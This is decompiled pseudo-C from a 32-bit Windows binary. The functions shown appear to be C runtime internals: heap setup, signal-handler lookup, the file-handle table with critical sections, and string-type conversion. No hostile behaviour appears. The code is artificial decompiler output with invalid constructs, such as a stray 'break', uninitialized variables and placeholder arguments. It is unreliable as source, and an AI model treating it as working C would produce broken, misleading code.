// Address range: 0x40d374 - 0x40d385
int32_t function_40d374(void) {
    int32_t * v1 = GetProcessHeap(); // 0x40d374
    int32_t v2 = (int32_t)v1; // 0x40d374
    g227 = v2;
    return v2 & -256 | (int32_t)(v1 != NULL);
}

// Address range: 0x40d385 - 0x40d38f
int32_t function_40d385(void) {
    // 0x40d385
    g227 = 0;
    int32_t v1; // 0x40d385
    return v1 & -256 | 1;
}

// Address range: 0x40d38f - 0x40d412
int32_t function_40d38f(int32_t * a1, int32_t * a2) {
    if (a1 == a2) {
        // 0x40d403
        return function_4065ae();
    }
    int32_t v1 = (int32_t)a2;
    int32_t v2 = (int32_t)a1;
    if (*(int32_t *)v2 != 0) {
        // 0x40d3b6
        if ((char)function_4065bf() == 0) {
            // break -> 0x40d3cc
            break;
        }
    }
    int32_t v3 = v2 + 8; // 0x40d3c4
    int32_t v4 = v3; // 0x40d3ca
    while (v3 != v1) {
        int32_t v5 = v3;
        if (*(int32_t *)v5 != 0) {
            // 0x40d3b6
            v4 = v5;
            if ((char)function_4065bf() == 0) {
                // break -> 0x40d3cc
                break;
            }
        }
        // 0x40d3c4
        v3 = v5 + 8;
        v4 = v3;
    }
    int32_t v6 = v4;
    if (v6 == v1 || v6 == v2) {
        // 0x40d403
        return function_4065ae();
    }
    int32_t v7 = v6 - 4;
    int32_t v8 = v7 - 4; // 0x40d3dc
    int32_t v9; // bp-20, 0x40d38f
    if (*(int32_t *)v8 != 0) {
        // 0x40d3e2
        if (*(int32_t *)v7 != 0) {
            // 0x40d3e8
            *(int32_t *)((int32_t)&v9 - 4) = 0;
            function_4065bf();
        }
    }
    int32_t v10 = v7 - 8; // 0x40d3fd
    while (v8 != v2) {
        // 0x40d3dc
        v7 = v10;
        v8 = v7 - 4;
        if (*(int32_t *)v8 != 0) {
            // 0x40d3e2
            if (*(int32_t *)v7 != 0) {
                // 0x40d3e8
                *(int32_t *)((int32_t)&v9 - 4) = 0;
                function_4065bf();
            }
        }
        // 0x40d3f5
        v10 = v7 - 8;
    }
    // 0x40d403
    return function_4065ae();
}

// Address range: 0x40d412 - 0x40d45f
int32_t function_40d412(int32_t * a1, int32_t * a2) {
    if (a1 == a2) {
        // 0x40d44e
        return function_4065ae();
    }
    int32_t v1 = (int32_t)a2 - 4; // 0x40d42e
    int32_t v2; // bp-16, 0x40d412
    if (*(int32_t *)v1 != 0) {
        // 0x40d435
        *(int32_t *)((int32_t)&v2 - 4) = 0;
        function_4065bf();
    }
    while (v1 - 4 != (int32_t)a1) {
        // 0x40d442
        v1 -= 8;
        if (*(int32_t *)v1 != 0) {
            // 0x40d435
            *(int32_t *)((int32_t)&v2 - 4) = 0;
            function_4065bf();
        }
    }
    // 0x40d44e
    return function_4065ae();
}

// Address range: 0x40d45f - 0x40d4aa
int32_t function_40d45f(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x40d45f
    function_406770(&g103, 12, (int32_t)&g266);
    int32_t v1; // 0x40d45f
    int32_t * v2 = (int32_t *)(v1 - 28); // 0x40d46b
    *v2 = 0;
    function_40bfa7(*(int32_t *)*(int32_t *)(v1 + 8));
    int32_t * v3 = (int32_t *)(v1 - 4); // 0x40d47a
    *v3 = 0;
    uint32_t v4 = g112 & 31; // 0x40d486
    int32_t v5 = g230 ^ g112; // 0x40d489
    int32_t v6 = v5; // 0x40d48f
    if (v4 != 0) {
        v6 = v5 >> v4 | v5 << 32 - v4;
    }
    *v2 = v6;
    *v3 = -2;
    function_40d4ad();
    int32_t result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40d4a2
    return result;
}

// Address range: 0x40d4ad - 0x40d4b9
int32_t function_40d4ad(void) {
    // 0x40d4ad
    int32_t v1; // 0x40d4ad
    return function_40bfef(*(int32_t *)*(int32_t *)(v1 + 16));
}

// Address range: 0x40d4b9 - 0x40d4e1
int32_t function_40d4b9(int32_t a1, int32_t * a2, int32_t a3, int32_t a4) {
    int32_t v1 = a1; // bp-12, 0x40d4c7
    int32_t v2 = a1; // bp-16, 0x40d4ca
    int32_t v3; // 0x40d4b9
    return function_40d45f(&v2, (int32_t)a2, &v1, a1, a1, v3);
}

// Address range: 0x40d4e1 - 0x40d523
int32_t function_40d4e1(int32_t a1) {
    int32_t result = &g228; // 0x40d4e1
    switch (a1) {
        case 6: {
        }
        case 22: {
            // 0x40d507
            result = &g230;
        }
        case 2: {
            // 0x40d503
            return result;
        }
        case 15: {
            // 0x40d503
            result = &g231;
            return result;
        }
        case 21: {
            // 0x40d503
            result = &g229;
            return result;
        }
        default: {
            // 0x40d503
            result = 0;
            return result;
        }
    }
}

// Address range: 0x40d523 - 0x40d54b
int32_t function_40d523(int32_t a1, int32_t a2) {
    int32_t v1 = a2;
    int32_t result = v1; // 0x40d53e
    while (*(int32_t *)(v1 + 4) != a1) {
        // 0x40d540
        result = 0;
        if (v1 == a2 + 132) {
            // break -> 0x40d549
            break;
        }
        v1 += 12;
        result = v1;
    }
    // 0x40d549
    return result;
}

// Address range: 0x40d54b - 0x40d562
int32_t function_40d54b(void) {
    // 0x40d54b
    int32_t v1; // bp-5, 0x40d54b
    int32_t v2; // 0x40d54b
    int32_t v3; // 0x40d54b
    return function_40d4b9(3, &v1, v3, v2);
}

// Address range: 0x40d562 - 0x40d59d
int32_t function_40d562(int32_t a1) {
    // 0x40d562
    function_409478(a1);
    function_409478(a1);
    function_409478(a1);
    return function_409478(a1);
}

// Address range: 0x40d59d - 0x40d5a6
int32_t function_40d59d(void) {
    // 0x40d59d
    return function_40ba33() + 8;
}

// Address range: 0x40d5a6 - 0x40d7ae
int32_t function_40d5a6(int32_t a1) {
    int32_t v1 = &g102; // bp-8, 0x40d5a8
    function_4113c0(&g102, 44, (int32_t)&g266);
    int32_t v2; // 0x40d5a6
    int32_t * v3 = (int32_t *)(v2 - 44); // 0x40d5b4
    *v3 = 0;
    int32_t * v4 = (int32_t *)(v2 - 52); // 0x40d5b7
    *v4 = 0;
    char * v5 = (char *)(v2 - 29); // 0x40d5bc
    *v5 = 1;
    int32_t v6 = *(int32_t *)(v2 + 8); // 0x40d5bf
    if (v6 > 8) {
        switch (v6) {
            case 11: {
                goto lab_0x40d600;
            }
            case 15: {
                goto lab_0x40d650;
            }
            default: {
                if (v6 > 22) {
                    int32_t v7 = function_40ab11(); // 0x40d62b
                }
                goto lab_0x40d650;
            }
        }
    } else {
        switch (v6) {
            case 8: {
                goto lab_0x40d600;
            }
            case 2: {
                goto lab_0x40d650;
            }
            default: {
                int32_t v8 = v6 - 4; // 0x40d5d4
                if (v8 == 0) {
                    goto lab_0x40d600;
                } else {
                    if (v8 != 2) {
                        // 0x40d62b
                        *(int32_t *)function_40ab11() = 22;
                        // 0x40d7a8
                        return function_411409();
                    }
                    goto lab_0x40d650;
                }
            }
        }
    }
  lab_0x40d600:;
    int32_t v9 = function_40bab7(); // 0x40d600
    *v3 = v9;
    if (v9 == 0) {
        // 0x40d7a8
        return function_411409();
    }
    int32_t v10 = function_40d523(v6, *(int32_t *)v9); // 0x40d619
    if (v10 == 0) {
        // 0x40d62b
        *(int32_t *)function_40ab11() = 22;
        // 0x40d7a8
        return function_411409();
    }
    // 0x40d645
    *v5 = 0;
    int32_t * v11 = (int32_t *)(v2 - 40); // 0x40d645
    *v11 = v10 + 8;
    int32_t * v12 = (int32_t *)(v2 - 48); // 0x40d648
    *v12 = 0;
    int32_t * v13 = v12; // 0x40d5a6
    int32_t * v14 = v11; // 0x40d5a6
    int32_t v15 = v9; // 0x40d5a6
    bool v16 = true; // 0x40d5a6
    goto lab_0x40d65b;
  lab_0x40d650:;
    int32_t v34 = function_40d4e1(v6); // 0x40d5f6
    int32_t * v35 = (int32_t *)(v2 - 40); // 0x40d645
    *v35 = v34;
    int32_t * v36 = (int32_t *)(v2 - 48); // 0x40d648
    *v36 = 0;
    function_40bfa7(3);
    v13 = v36;
    v14 = v35;
    v15 = 0;
    v16 = *v5 == 0;
    goto lab_0x40d65b;
  lab_0x40d65b:;
    int32_t * v17 = (int32_t *)(v2 - 36); // 0x40d65b
    *v17 = 0;
    char * v18 = (char *)(v2 - 30); // 0x40d65f
    *v18 = 0;
    int32_t * v19 = (int32_t *)(v2 - 4); // 0x40d663
    *v19 = 0;
    int32_t v20 = *v14; // 0x40d667
    char v21; // 0x40d5a6
    int32_t v22; // 0x40d5a6
    if (v16) {
        // 0x40d682
        v21 = 0;
        v22 = *(int32_t *)v20;
    } else {
        uint32_t v23 = g112 & 31; // 0x40d676
        int32_t v24 = *(int32_t *)v20 ^ g112; // 0x40d679
        int32_t v25 = v24; // 0x40d67b
        if (v23 != 0) {
            v25 = v24 >> v23 | v24 << 32 - v23;
        }
        v21 = *v5;
        v22 = v25;
    }
    int32_t v26 = &v1;
    *v17 = v22;
    int32_t v27 = v2 - 56; // 0x40d691
    *(int32_t *)v27 = (int32_t)(v22 == 1);
    *v18 = (char)(v22 == 1);
    if (v22 == 1) {
        goto lab_0x40d729;
    } else {
        if (v22 == 0) {
            if (v21 != 0) {
                // 0x40d6a7
                function_40bfef(3);
            }
            // 0x40d6af
            *(int32_t *)(v26 - 4) = 3;
            function_409b62((int32_t)&g266);
            // UNREACHABLE
        }
        switch (v6) {
            case 11: {
                goto lab_0x40d6c4;
            }
            case 8: {
                goto lab_0x40d6c4;
            }
            default: {
                if (v6 != 4) {
                    goto lab_0x40d6e7;
                } else {
                    goto lab_0x40d6c4;
                }
            }
        }
    }
  lab_0x40d729:
    // 0x40d729
    *v19 = -2;
    function_40d766();
    if (*(char *)v27 != 0) {
        function_40d7a6();
    }
    if (v6 != 8) {
        function_40d775();
    }
    // 0x40d73f
    *(int32_t *)(v26 - 4) = *(int32_t *)(function_40ba33() + 8);
    *(int32_t *)(v26 - 8) = 8;
    function_4065bf();
    return function_40d782((int32_t)&g266);
  lab_0x40d6c4:;
    int32_t * v28 = (int32_t *)(v15 + 4); // 0x40d6c4
    *v13 = *v28;
    *v28 = 0;
    if (v6 != 8) {
        goto lab_0x40d70d;
    } else {
        // 0x40d6d2
        *v4 = *(int32_t *)function_40d59d();
        *(int32_t *)function_40d59d() = 140;
        goto lab_0x40d6e7;
    }
  lab_0x40d6e7:
    if (v6 != 8) {
        goto lab_0x40d70d;
    } else {
        int32_t v29 = *(int32_t *)v15; // 0x40d6f2
        int32_t v30 = v29 + 36; // 0x40d6f2
        int32_t * v31 = (int32_t *)(v2 - 60); // 0x40d6fd
        *v31 = v30;
        int32_t v32 = v30;
        *(int32_t *)(v32 + 8) = 0;
        int32_t v33 = v32 + 12; // 0x40d708
        *v31 = v33;
        while (v32 != v29 + 132) {
            // 0x40d704
            v32 = v33;
            *(int32_t *)(v32 + 8) = 0;
            v33 = v32 + 12;
            *v31 = v33;
        }
        goto lab_0x40d729;
    }
  lab_0x40d70d:
    // 0x40d70d
    *(int32_t *)*v14 = g112;
    goto lab_0x40d729;
}

// Address range: 0x40d766 - 0x40d775
int32_t function_40d766(void) {
    // 0x40d766
    int32_t result; // 0x40d766
    int32_t v1; // 0x40d766
    if (*(char *)(v1 - 29) != 0) {
        // 0x40d76c
        result = function_40bfef(3);
    }
    // 0x40d774
    return result;
}

// Address range: 0x40d775 - 0x40d782
int32_t function_40d775(void) {
    // 0x40d775
    return function_4065bf();
}

// Address range: 0x40d782 - 0x40d7a6
int32_t function_40d782(int32_t a1) {
    // 0x40d782
    int32_t v1; // 0x40d782
    int32_t v2; // 0x40d782
    if (v2 != 4 == (v2 != v1 && v2 != 11)) {
        function_40d7a6();
    }
    // 0x40d791
    int32_t v3; // 0x40d782
    int32_t v4; // 0x40d782
    *(int32_t *)(v4 + 4) = *(int32_t *)(v3 - 48);
    if (v2 != v1) {
        function_40d7a6();
    }
    int32_t result = function_40ba33(); // 0x40d79b
    *(int32_t *)(result + 8) = *(int32_t *)(v3 - 52);
    return result;
}

// Address range: 0x40d7a6 - 0x40d7a8
int32_t function_40d7a6(void) {
    // 0x40d7a6
    return 0;
}

// Address range: 0x40d7ae - 0x40d828
int32_t function_40d7ae(void) {
    int32_t v1 = 48; // bp-24, 0x40d7b7
    int32_t result = function_40c4a1(64, 48); // 0x40d7bb
    if (result == 0) {
        // 0x40d819
        int32_t v2; // bp-20, 0x40d7ae
        *(int32_t *)((int32_t)&v2 - 4) = 0;
        function_40bbdc((int32_t)&g266);
        return 0;
    }
    int32_t v3 = &v1; // 0x40d7df
    int32_t v4 = result + 32;
    *(int32_t *)(v3 - 4) = 0;
    int32_t v5 = v3 - 8; // 0x40d7e2
    *(int32_t *)v5 = 4000;
    v3 -= 12;
    *(int32_t *)v3 = v4 - 32;
    function_40c278((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    *(int32_t *)(v4 - 8) = -1;
    *(int32_t *)v4 = 0;
    *(int32_t *)(v4 + 4) = 0;
    *(int32_t *)(v4 + 8) = 0xa0a0000;
    *(char *)(v4 + 12) = 10;
    char * v6 = (char *)(v4 + 13); // 0x40d80a
    *v6 = *v6 & -8;
    *(char *)(v4 + 14) = 0;
    int32_t v7 = v4 + 48; // 0x40d813
    while (v4 != result + 3056) {
        // 0x40d7e1
        v4 = v7;
        *(int32_t *)(v3 - 4) = 0;
        v5 = v3 - 8;
        *(int32_t *)v5 = 4000;
        v3 -= 12;
        *(int32_t *)v3 = v4 - 32;
        function_40c278((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        *(int32_t *)(v4 - 8) = -1;
        *(int32_t *)v4 = 0;
        *(int32_t *)(v4 + 4) = 0;
        *(int32_t *)(v4 + 8) = 0xa0a0000;
        *(char *)(v4 + 12) = 10;
        v6 = (char *)(v4 + 13);
        *v6 = *v6 & -8;
        *(char *)(v4 + 14) = 0;
        v7 = v4 + 48;
    }
    // 0x40d819
    *(int32_t *)(v5 - 4) = 0;
    function_40bbdc((int32_t)&g266);
    return result;
}

// Address range: 0x40d828 - 0x40d85d
int32_t function_40d828(int32_t a1) {
    if (a1 == 0) {
        // 0x40d85a
        int32_t result; // 0x40d828
        return result;
    }
    int32_t v1 = a1;
    int32_t v2; // bp-16, 0x40d828
    int32_t v3 = &v2;
    int32_t v4 = v3 - 4; // 0x40d843
    *(int32_t *)v4 = v1;
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
    while (v1 != a1 + 3024) {
        // 0x40d843
        v1 += 48;
        v3 = v4;
        v4 = v3 - 4;
        *(int32_t *)v4 = v1;
        DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
    }
    // 0x40d851
    *(int32_t *)(v3 - 8) = a1;
    // 0x40d85a
    return function_40bbdc((int32_t)&g266);
}

// Address range: 0x40d85d - 0x40d8e9
int32_t function_40d85d(int32_t a1) {
    // 0x40d85d
    function_406770(&g104, 20, (int32_t)&g266);
    int32_t v1; // 0x40d85d
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x40d869
    int32_t result; // 0x40d887
    if (*v2 >= 0x2000) {
        // 0x40d876
        *(int32_t *)function_40ab11() = 9;
        // 0x40d885
        result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    int32_t * v3 = (int32_t *)(v1 - 28); // 0x40d88f
    *v3 = 0;
    function_40bfa7(7);
    int32_t * v4 = (int32_t *)(v1 - 4); // 0x40d89a
    *v4 = 0;
    int32_t * v5 = (int32_t *)(v1 - 32); // 0x40d8a4
    *v5 = 0;
    int32_t v6 = 0; // 0x40d8aa
    if (*v2 >= g209) {
        int32_t * v7 = (int32_t *)(4 * v6 + (int32_t)&g207); // 0x40d8ac
        int32_t v8 = g209; // 0x40d8b3
        int32_t v9; // 0x40d8b5
        if (*v7 == 0) {
            // 0x40d8b5
            v9 = function_40d7ae();
            *v7 = v9;
            if (v9 == 0) {
                // 0x40d8c5
                *v3 = 12;
                goto lab_0x40d8cb;
            }
            // 0x40d8d9
            v8 = g209 + 64;
            g209 = v8;
        }
        int32_t v10 = v8;
        v6++;
        *v5 = v6;
        while (*v2 >= v10) {
            // 0x40d8ac
            v7 = (int32_t *)(4 * v6 + (int32_t)&g207);
            v8 = v10;
            if (*v7 == 0) {
                // 0x40d8b5
                v9 = function_40d7ae();
                *v7 = v9;
                if (v9 == 0) {
                    // 0x40d8c5
                    *v3 = 12;
                    goto lab_0x40d8cb;
                }
                // 0x40d8d9
                v8 = g209 + 64;
                g209 = v8;
            }
            // 0x40d8e6
            v10 = v8;
            v6++;
            *v5 = v6;
        }
    }
  lab_0x40d8cb:
    // 0x40d8cb
    *v4 = -2;
    function_40d8ec();
    // 0x40d885
    result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x40d8ec - 0x40d8f5
int32_t function_40d8ec(void) {
    // 0x40d8ec
    return function_40bfef(7);
}

// Address range: 0x40d8f5 - 0x40d918
int32_t function_40d8f5(int32_t a1) {
    int32_t v1 = *(int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40d908
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)(v1 + 48 * (a1 & 63)));
    return &g266;
}

// Address range: 0x40d918 - 0x40d93b
int32_t function_40d918(int32_t a1) {
    int32_t v1 = *(int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40d92b
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)(v1 + 48 * (a1 & 63)));
    return &g266;
}

// Address range: 0x40d93b - 0x40d9cc
int32_t function_40d93b(uint32_t a1) {
    // 0x40d93b
    if (a1 >= 0) {
        // 0x40d94a
        if ((uint32_t)g209 > a1) {
            int32_t v1 = 48 * (a1 & 63);
            int32_t * v2 = (int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40d95f
            int32_t v3 = *v2; // 0x40d95f
            if ((*(char *)(v1 + 40 + v3) & 1) != 0) {
                int32_t v4 = v1 + 24; // 0x40d96d
                if (*(int32_t *)(v3 + v4) != -1) {
                    // 0x40d974
                    int32_t v5; // 0x40d93b
                    int32_t v6; // 0x40d93b
                    int32_t v7; // 0x40d93b
                    int32_t v8; // 0x40d93b
                    if (function_40a5c6(v5, v6, v8, v7) != 1) {
                        // 0x40d9a1
                        *(int32_t *)(*v2 + v4) = -1;
                        // 0x40d9c7
                        return 0;
                    }
                    int32_t nStdHandle = -10; // 0x40d982
                    if (a1 != 0) {
                        int32_t v9 = a1 - 1; // 0x40d984
                        nStdHandle = -11;
                        if (v9 != 0) {
                            // 0x40d989
                            nStdHandle = -12;
                            if (v9 != 1) {
                                // 0x40d9a1
                                *(int32_t *)(*v2 + v4) = -1;
                                // 0x40d9c7
                                return 0;
                            }
                        }
                    }
                    // 0x40d99b
                    SetStdHandle(nStdHandle, NULL);
                    // 0x40d9a1
                    *(int32_t *)(*v2 + v4) = -1;
                    // 0x40d9c7
                    return 0;
                }
            }
        }
    }
    // 0x40d9b1
    *(int32_t *)function_40ab11() = 9;
    *(int32_t *)function_40aafe() = 0;
    // 0x40d9c7
    return -1;
}

// Address range: 0x40d9cc - 0x40da36
int32_t function_40d9cc(uint32_t a1) {
    if (a1 == -2) {
        // 0x40d9d9
        *(int32_t *)function_40aafe() = 0;
        *(int32_t *)function_40ab11() = 9;
        // 0x40da31
        return -1;
    }
    if ((int32_t)a1 < 0 || (uint32_t)g209 <= a1) {
        // 0x40da19
        *(int32_t *)function_40aafe() = 0;
        *(int32_t *)function_40ab11() = 9;
        // 0x40da31
        return -1;
    }
    int32_t v1 = *(int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40da05
    int32_t v2 = v1 + 48 * (a1 & 63);
    if ((*(char *)(v2 + 40) & 1) != 0) {
        // 0x40da13
        return *(int32_t *)(v2 + 24);
    }
    // 0x40da19
    *(int32_t *)function_40aafe() = 0;
    *(int32_t *)function_40ab11() = 9;
    // 0x40da31
    return -1;
}

// Address range: 0x40da36 - 0x40db34
int32_t function_40da36(int32_t a1) {
    if (a1 == 0) {
        // 0x40db31
        int32_t result; // 0x40da36
        return result;
    }
    int32_t v1 = *(int32_t *)(a1 + 12); // 0x40da47
    if (v1 != *(int32_t *)0x426714) {
        // 0x40da52
        function_40bbdc(v1);
    }
    int32_t v2 = *(int32_t *)(a1 + 16); // 0x40da59
    if (v2 != *(int32_t *)0x426718) {
        // 0x40da64
        function_40bbdc(v2);
    }
    int32_t v3 = *(int32_t *)(a1 + 20); // 0x40da6b
    if (v3 != *(int32_t *)0x42671c) {
        // 0x40da76
        function_40bbdc(v3);
    }
    // 0x40da7d
    int32_t v4; // bp-8, 0x40da36
    int32_t v5 = &v4; // 0x40da3b
    int32_t v6 = *(int32_t *)(a1 + 24); // 0x40da7d
    if (v6 != *(int32_t *)0x426720) {
        // 0x40da88
        *(int32_t *)(v5 - 4) = v6;
        function_40bbdc((int32_t)&g266);
    }
    int32_t v7 = *(int32_t *)(a1 + 28); // 0x40da8f
    if (v7 != *(int32_t *)0x426724) {
        // 0x40da9a
        *(int32_t *)(v5 - 4) = v7;
        function_40bbdc((int32_t)&g266);
    }
    int32_t v8 = *(int32_t *)(a1 + 32); // 0x40daa1
    if (v8 != *(int32_t *)0x426728) {
        // 0x40daac
        *(int32_t *)(v5 - 4) = v8;
        function_40bbdc((int32_t)&g266);
    }
    int32_t v9 = *(int32_t *)(a1 + 36); // 0x40dab3
    if (v9 != (int32_t)g136) {
        // 0x40dabe
        *(int32_t *)(v5 - 4) = v9;
        function_40bbdc((int32_t)&g266);
    }
    int32_t v10 = *(int32_t *)(a1 + 56); // 0x40dac5
    if (v10 != *(int32_t *)0x426740) {
        // 0x40dad0
        *(int32_t *)(v5 - 4) = v10;
        function_40bbdc((int32_t)&g266);
    }
    int32_t v11 = *(int32_t *)(a1 + 60); // 0x40dad7
    if (v11 != *(int32_t *)0x426744) {
        // 0x40dae2
        *(int32_t *)(v5 - 4) = v11;
        function_40bbdc((int32_t)&g266);
    }
    int32_t v12 = *(int32_t *)(a1 + 64); // 0x40dae9
    if (v12 != *(int32_t *)0x426748) {
        // 0x40daf4
        *(int32_t *)(v5 - 4) = v12;
        function_40bbdc((int32_t)&g266);
    }
    int32_t v13 = *(int32_t *)(a1 + 68); // 0x40dafb
    if (v13 != *(int32_t *)0x42674c) {
        // 0x40db06
        *(int32_t *)(v5 - 4) = v13;
        function_40bbdc((int32_t)&g266);
    }
    int32_t v14 = *(int32_t *)(a1 + 72); // 0x40db0d
    if (v14 != *(int32_t *)0x426750) {
        // 0x40db18
        *(int32_t *)(v5 - 4) = v14;
        function_40bbdc((int32_t)&g266);
    }
    int32_t v15 = *(int32_t *)(a1 + 76); // 0x40db1f
    int32_t result2 = v15; // 0x40db28
    if (v15 != (int32_t)g138) {
        // 0x40db2a
        *(int32_t *)(v5 - 4) = v15;
        result2 = function_40bbdc((int32_t)&g266);
    }
    // 0x40db31
    return result2;
}

// Address range: 0x40db34 - 0x40db9d
int32_t function_40db34(int32_t a1) {
    if (a1 == 0) {
        // 0x40db9a
        int32_t result; // 0x40db34
        return result;
    }
    int32_t v1 = *(int32_t *)a1; // 0x40db41
    if (v1 != *(int32_t *)0x426708) {
        // 0x40db4b
        function_40bbdc(v1);
    }
    int32_t v2 = *(int32_t *)(a1 + 4); // 0x40db52
    if (v2 != *(int32_t *)0x42670c) {
        // 0x40db5d
        function_40bbdc(v2);
    }
    int32_t v3 = *(int32_t *)(a1 + 8); // 0x40db64
    if (v3 != (int32_t)g135) {
        // 0x40db6f
        function_40bbdc(v3);
    }
    // 0x40db76
    int32_t v4; // bp-8, 0x40db34
    int32_t v5 = &v4; // 0x40db39
    int32_t v6 = *(int32_t *)(a1 + 48); // 0x40db76
    if (v6 != *(int32_t *)0x426738) {
        // 0x40db81
        *(int32_t *)(v5 - 4) = v6;
        function_40bbdc((int32_t)&g266);
    }
    int32_t v7 = *(int32_t *)(a1 + 52); // 0x40db88
    int32_t result2 = v7; // 0x40db91
    if (v7 != (int32_t)g137) {
        // 0x40db93
        *(int32_t *)(v5 - 4) = v7;
        result2 = function_40bbdc((int32_t)&g266);
    }
    // 0x40db9a
    return result2;
}

// Address range: 0x40db9d - 0x40dbd9
int32_t function_40db9d(uint32_t a1, int32_t a2) {
    int32_t result = 4 * a2 + a1; // 0x40dbad
    int32_t v1 = a2 & 0x3fffffff; // 0x40dbb7
    if (v1 == 0 || result < a1) {
        // 0x40dbd4
        return result;
    }
    int32_t v2 = a1; // 0x40db9d
    int32_t v3 = 0; // 0x40dbcb
    int32_t v4; // bp-16, 0x40db9d
    *(int32_t *)((int32_t)&v4 - 4) = *(int32_t *)v2;
    int32_t result2 = function_40bbdc((int32_t)&g266); // 0x40dbc6
    v3++;
    v2 += 4;
    while (v3 != v1) {
        // 0x40dbc4
        *(int32_t *)((int32_t)&v4 - 4) = *(int32_t *)v2;
        result2 = function_40bbdc((int32_t)&g266);
        v3++;
        v2 += 4;
    }
    // 0x40dbd4
    return result2;
}

// Address range: 0x40dbd9 - 0x40dcbd
int32_t function_40dbd9(int32_t a1, int32_t a2, int32_t a3) {
    int32_t result; // 0x40dbd9
    if (a1 != 0) {
        // 0x40dbea
        function_40db9d(a1, 7);
        function_40db9d(a1 + 28, 7);
        function_40db9d(a1 + 56, 12);
        function_40db9d(a1 + 104, 12);
        function_40db9d(a1 + 152, 2);
        function_40bbdc(*(int32_t *)(a1 + 160));
        function_40bbdc(*(int32_t *)(a1 + 164));
        function_40bbdc(*(int32_t *)(a1 + 168));
        function_40db9d(a1 + 180, 7);
        function_40db9d(a1 + 208, 7);
        function_40db9d(a1 + 236, 12);
        function_40db9d(a1 + 284, 12);
        function_40db9d(a1 + 332, 2);
        function_40bbdc(*(int32_t *)(a1 + 340));
        function_40bbdc(*(int32_t *)(a1 + 344));
        function_40bbdc(*(int32_t *)(a1 + 348));
        result = function_40bbdc(*(int32_t *)(a1 + 352));
    }
    // 0x40dcba
    return result;
}

// Address range: 0x40dcbd - 0x40ddda
int32_t function_40dcbd(int32_t a1, int32_t dwInfoType, char * lpMultiByteStr, int32_t cbMultiByte, int32_t * lpCharType, int32_t a6, int32_t a7) {
    // 0x40dcbd
    int32_t v1; // 0x40dcbd
    function_4093d4(a1, v1);
    int32_t CodePage = a6; // 0x40dce2
    if (a6 == 0) {
        // 0x40dce4
        int32_t v2; // 0x40dcbd
        CodePage = *(int32_t *)(v2 + 8);
    }
    int32_t v3 = CodePage; // bp-68, 0x40dd09
    int32_t cchWideChar = MultiByteToWideChar(CodePage, 8 * (int32_t)(a7 != 0) | 1, lpMultiByteStr, cbMultiByte, NULL, 0); // 0x40dd0a
    int32_t v4; // 0x40dcbd
    int32_t v5; // 0x40dcbd
    int32_t v6; // 0x40dcbd
    int32_t v7; // 0x40dd09
    uint32_t v8; // 0x40dd1b
    if (cchWideChar == 0) {
        goto lab_0x40ddb4;
    } else {
        // 0x40dd1b
        v7 = &v3;
        v8 = 2 * cchWideChar;
        v6 = v7;
        v5 = 0;
        if (v8 > 0xfffffff7) {
            goto lab_0x40ddad;
        } else {
            uint32_t v9 = v8 + 8; // 0x40dd29
            if (v9 < 1025) {
                // 0x40dd3c
                function_411590();
                v3 = 0xcccc;
                v4 = v7;
                goto lab_0x40dd75;
            } else {
                int32_t v10 = function_40bc16(v9); // 0x40dd5c
                v6 = v7;
                v5 = 0;
                if (v10 == 0) {
                    goto lab_0x40ddad;
                } else {
                    // 0x40dd68
                    *(int32_t *)v10 = 0xdddd;
                    v4 = v10;
                    goto lab_0x40dd75;
                }
            }
        }
    }
  lab_0x40ddb4:;
    char v11; // 0x40dcbd
    if (v11 != 0) {
        // 0x40ddba
        int32_t v12; // 0x40dcbd
        int32_t * v13 = (int32_t *)(v12 + 848); // 0x40ddbd
        *v13 = *v13 & -3;
    }
    // 0x40ddc4
    return function_4065ae();
  lab_0x40ddad:
    // 0x40ddad
    *(int32_t *)(v6 - 4) = v5;
    function_40ddda((int32_t)&g266);
    goto lab_0x40ddb4;
  lab_0x40dd75:;
    int32_t v14 = v4 + 8; // 0x40dd6e
    v6 = v7;
    v5 = 0;
    if (v14 != 0) {
        // 0x40dd79
        function_4071b0((int32_t *)v14, 0, v8);
        int16_t * lpWideCharStr = (int16_t *)v14; // 0x40dd87
        int32_t v15 = CodePage; // bp-92, 0x40dd90
        int32_t cchSrc = MultiByteToWideChar(CodePage, 1, lpMultiByteStr, cbMultiByte, lpWideCharStr, cchWideChar); // 0x40dd93
        v6 = &v15;
        v5 = v14;
        if (cchSrc != 0) {
            int32_t v16 = dwInfoType; // bp-108, 0x40dda2
            GetStringTypeW(dwInfoType, lpWideCharStr, cchSrc, (int16_t *)lpCharType);
            v6 = &v16;
            v5 = v14;
        }
    }
    goto lab_0x40ddad;
}

// Address range: 0x40ddda - 0x40ddfa
int32_t function_40ddda(int32_t a1) {
    // 0x40ddda
    if (a1 == 0) {
        // 0x40ddf8
        return 0;
    }
    int32_t v1 = a1 - 8; // 0x40dde6
    int32_t result = v1; // 0x40ddef
    if (*(int32_t *)v1 == 0xdddd) {
        // 0x40ddf1
        result = function_40bbdc(v1);
    }
    // 0x40ddf8
    return result;
}

// Address range: 0x40ddfa - 0x40de77
int32_t function_40ddfa(int32_t a1) {
    int32_t * v1 = (int32_t *)(a1 + 12); // 0x40de02
    *v1 = *v1 + 1;
    int32_t v2 = *(int32_t *)(a1 + 124); // 0x40de06
    if (v2 != 0) {
        int32_t * v3 = (int32_t *)v2; // 0x40de0d
        *v3 = *v3 + 1;
    }
    int32_t v4 = *(int32_t *)(a1 + 132); // 0x40de10
    if (v4 != 0) {
        int32_t * v5 = (int32_t *)v4; // 0x40de1a
        *v5 = *v5 + 1;
    }
